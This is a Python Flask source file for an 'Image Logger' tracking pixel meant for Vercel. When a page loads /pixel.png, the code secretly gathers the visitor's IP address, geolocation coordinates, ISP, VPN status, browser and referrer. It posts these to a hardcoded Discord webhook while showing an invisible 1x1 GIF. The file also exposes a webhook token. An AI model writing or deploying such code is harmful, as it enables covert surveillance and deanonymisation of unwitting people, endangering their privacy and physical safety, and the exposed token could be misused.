
from flask import Flask, request, Response
import requests
import json
from datetime import datetime

app = Flask(__name__)

# --- HARDCODED DISCORD WEBHOOK (User Requested) ---
# WARNING: This webhook is now public. Regenerate it in Discord immediately after testing.
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY"

# --- HELPER: Get the REAL IP address (bypasses Vercel proxy) ---
def get_client_ip():
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0].strip()
    else:
        ip = request.remote_addr
    return ip

# --- HELPER: Get Geolocation & VPN status via ip-api.com ---
def get_ip_info(ip):
    try:
        response = requests.get(
            f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,as,proxy,query',
            timeout=5
        )
        data = response.json()
        if data.get('status') == 'success':
            return data
        return None
    except Exception:
        return None

# --- HELPER: Send a beautiful embed to Discord ---
def send_discord_notification(ip_info):
    if not DISCORD_WEBHOOK_URL:
        print("❌ Webhook URL is empty!")
        return

    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct Access')
    language = request.headers.get('Accept-Language', 'Unknown')
    ip = get_client_ip()

    # VPN Detection Logic
    vpn_status = "🟢 OFF (No VPN/Proxy detected)"
    embed_color = 0x00ff00  # Green
    if ip_info and ip_info.get('proxy') is True:
        vpn_status = "🔴 ON (VPN/Proxy/Cloudflare detected)"
        embed_color = 0xff0000  # Red

    # Build the location string
    if ip_info:
        location = f"{ip_info.get('city', 'N/A')}, {ip_info.get('regionName', 'N/A')}, {ip_info.get('country', 'N/A')}"
        isp = ip_info.get('isp', 'N/A')
        coords = f"{ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}"
    else:
        location = "N/A (IP lookup failed)"
        isp = "N/A"
        coords = "N/A"

    # Create the Discord Embed
    embed = {
        "title": "🎯 Invisible Pixel Logged!",
        "color": embed_color,
        "thumbnail": {"url": "https://cdn-icons-png.flaticon.com/512/3063/3063225.png"},
        "fields": [
            {"name": "🌍 IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "🛡️ VPN / Proxy", "value": vpn_status, "inline": True},
            {"name": "📍 Approximate Location", "value": location, "inline": False},
            {"name": "🗺️ Coordinates", "value": f"`{coords}`", "inline": True},
            {"name": "📡 ISP / Organization", "value": isp, "inline": True},
            {"name": "💻 Device & Browser", "value": user_agent[:80] + ("..." if len(user_agent) > 80 else ""), "inline": False},
            {"name": "🔗 Referrer (Where they clicked)", "value": referer if referer else "Direct", "inline": True},
            {"name": "🌐 Language", "value": language, "inline": True},
            {"name": "🕒 Timestamp", "value": f"<t:{int(datetime.utcnow().timestamp())}:F>", "inline": False}
        ],
        "footer": {"text": "Python Image Logger · Vercel"},
        "timestamp": datetime.utcnow().isoformat()
    }

    payload = {"embeds": [embed]}

    try:
        resp = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        if resp.status_code != 204:
            print(f"Discord error: {resp.status_code} - {resp.text}")
    except Exception as e:
        print(f"Failed to send to Discord: {e}")

# --- ROUTE 1: Homepage (just to confirm it's alive) ---
@app.route('/')
def home():
    return "Image Logger is active. The tracking pixel is at /pixel.png"

# --- ROUTE 2: The Magic Tracking Pixel ---
@app.route('/pixel.png')
def pixel():
    # 1. Get IP and Geolocation
    ip = get_client_ip()
    ip_info = get_ip_info(ip)

    # 2. Send notification to Discord
    send_discord_notification(ip_info)

    # 3. Return a 1x1 transparent GIF (Invisible to the user)
    transparent_gif = bytes([
        0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
        0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00,
        0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x01, 0x00,
        0x00
    ])
    return Response(transparent_gif, mimetype='image/gif')

# --- For local testing (not used by Vercel) ---
if __name__ == '__main__':
    app.run(debug=True)
